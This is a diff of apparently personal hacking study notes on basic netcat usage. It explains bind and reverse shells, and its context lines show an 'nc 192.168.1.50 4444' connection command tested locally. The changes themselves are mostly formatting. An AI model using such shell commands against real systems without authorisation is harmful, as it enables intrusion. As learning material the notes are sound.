@@ -1,5 +1,3 @@
-# Hacking Study Notes - Netcat Basic Usage
-
 Netcat is a networking utility that creates network connections using TCP or UDP and allows data to be sent and received.
 
 In plain terms — a tool that lets you transfer files over a network or interact with other computers.
@@ -8,11 +6,12 @@ Netcat requires no complex syntax, is intuitive, and covers everything from init
 
 Today I'll walk through basic netcat usage with some hands-on practice.
 
-Netcat supports various connection modes, including a bind shell (attacker connects to target) and a reverse shell (target connects back to attacker).
+Netcat supports various connection modes, including a **bind shell** (attacker connects to target) and a **reverse shell** (target connects back to attacker).
 
 (For a basic explanation of shells: https://unknown08.tistory.com/36)
 
-Important: the order of commands differs between reverse shell and bind shell.
+> Important: the order of commands differs between reverse shell and bind shell.
+> 
 
 ```bash
 ### Reverse Shell
@@ -46,7 +45,7 @@ nc 192.168.1.50 4444
 # 4444: port to connect to
 ```
 
-※ Tested in a local environment, so localhost was used instead of an actual IP.
+※ Tested in a local environment, so [localhost](http://localhost) was used instead of an actual IP.
 
 Once you enter the commands, you'll see a connection message like this (reverse shell):
 
